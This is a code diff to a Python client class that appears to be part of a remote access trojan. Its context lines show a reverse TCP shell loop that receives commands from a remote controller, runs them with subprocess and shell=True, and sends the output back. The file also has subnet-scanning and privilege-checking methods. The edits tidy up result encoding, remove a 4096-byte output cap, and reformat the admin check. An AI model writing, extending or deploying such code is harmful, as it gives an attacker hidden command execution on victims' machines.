@@ -469,6 +469,7 @@ class Client():
                     prompt = "[{} @ %s]> " % os.getcwd()
                     self._send(prompt, method='prompt')   
                     data = self._receive()
+                    
                     if not data:
                         continue
                     
@@ -476,17 +477,17 @@ class Client():
                     
                     if task in self._commands:
                         try:
-                            result  = self._commands[task](action) if len(action) else self._commands[task]()
+                            result  = bytes(self._commands[task](action) if len(action) else self._commands[task]())
                         except Exception as e1:
-                            result  = str(e1)
+                            result  = bytes(e1)
                     else:
                         try:
                             result  = bytes().join(subprocess.Popen(data, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                         except Exception as e2:
-                            result  = str(e2)
+                            result  = bytes(e2)
                             
                     if result and len(result):
-                        self._send(result[:4096], method=task)
+                        self._send(result, method=task)
                         
                     for task, worker in self._threads.items():
                         if not worker.is_alive():
@@ -494,7 +495,7 @@ class Client():
                             del _
                             
             except Exception as e3:
-                self._debug("'{}' returned error: '{}'".format(self.reverse_tcp_shell.func_name, str(e3)))
+                self._debug("{} returned error: {}".format(self.reverse_tcp_shell.func_name, str(e3)))
                 break
 
     def _scan_subnet(self, host):
@@ -1258,8 +1259,8 @@ class Client():
         """
         check if current user has root privileges
         """
-        try:
-            return os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()
+        try:   
+            return "\tCurrent User:\t{}\n\tAdministrator:\t{}".format(self._info.get('username'),  bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()))
         except Exception as e:
             return "Command '{}' returned error: '{}'".format(self.admin.func_name, str(e))
 
